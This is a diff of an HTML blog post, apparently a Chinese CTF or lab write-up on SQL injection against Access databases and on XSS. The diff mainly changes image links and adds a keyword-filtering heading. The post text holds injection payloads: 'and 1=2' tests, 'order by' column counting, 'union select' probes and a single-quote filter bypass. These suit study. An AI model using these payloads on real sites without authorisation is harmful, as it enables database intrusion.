@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">885</span>
+            <span class="post-count">890</span>
         </span>
     </span>
 
@@ -127,10 +127,10 @@
 <p>and 1&#x3D;2页面空白</p>
 <p>存在数字型注入</p>
 <p>id&#x3D;33 order by 6#</p>
-<p><img src="/../../../Typora/img111/image-20230705092013304.png" alt="image-20230705092013304"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230705092013304.png"></p>
 <p>id&#x3D;33 order by 5</p>
 <p>id&#x3D;-33%20union%20select%201,2,3,4,5</p>
-<p><img src="/../../../Typora/img111/image-20230705092329310.png" alt="image-20230705092329310"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230705092329310.png"></p>
 <p>-33%20union%20select%201,2,3,4,5%20from%20user</p>
 <blockquote>
 <p>FROM 子句语法错误。</p>
@@ -141,14 +141,14 @@
 <p>不能读取记录；在 ‘MSysObjects’ 上没有读取数据权限。</p>
 </blockquote>
 <p>尝试了基本的表名如admin,user,manager,name等无果，不再尝试</p>
-<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p><img src="/../../../Typora/img111/image-20230705095051817.png" alt="image-20230705095051817"></p>
-<p><img src="/../../../Typora/img111/image-20230705094840425.png" alt="image-20230705094840425"></p>
+<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230705095051817.png"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230705094840425.png"></p>
 <h1 id="2-web2"><a href="#2-web2" class="headerlink" title="2.web2"></a>2.web2</h1><p>xsk.asp?id&#x3D;1%20and%201&#x3D;1</p>
 <p>回显</p>
 <p>1&#x3D;2不回显</p>
 <p>存在数字型注入</p>
 <h1 id="3-web3"><a href="#3-web3" class="headerlink" title="3.web3"></a>3.web3</h1><h2 id="access注入-1"><a href="#access注入-1" class="headerlink" title="access注入"></a>access注入</h2><p>id&#x3D;12’</p>
-<p><img src="/../../../Typora/img111/image-20230706113557290.png"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230706113557290.png"></p>
 <p>id&#x3D;12 and 1&#x3D;1 和id&#x3D;12 and 1&#x3D;2不同，则判断数字型注入</p>
 <p>id&#x3D;12 order by 7#错误</p>
 <p>id&#x3D;12 order by 6#正确</p>
@@ -216,6 +216,7 @@
 <p>id&#x3D;1221 and 1&#x3D;2 重定向</p>
 <h2 id="web13（单引号过滤）"><a href="#web13（单引号过滤）" class="headerlink" title="web13（单引号过滤）"></a>web13（单引号过滤）</h2><p>编码或改成双引号，构造双引号为单引号</p>
 <p>id&#x3D;23” or “1” like “1“</p>
+<h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><p><img src="/../../../Typora/img111/image-20230709224116536.png"></p>
  
       <!-- reward -->
       
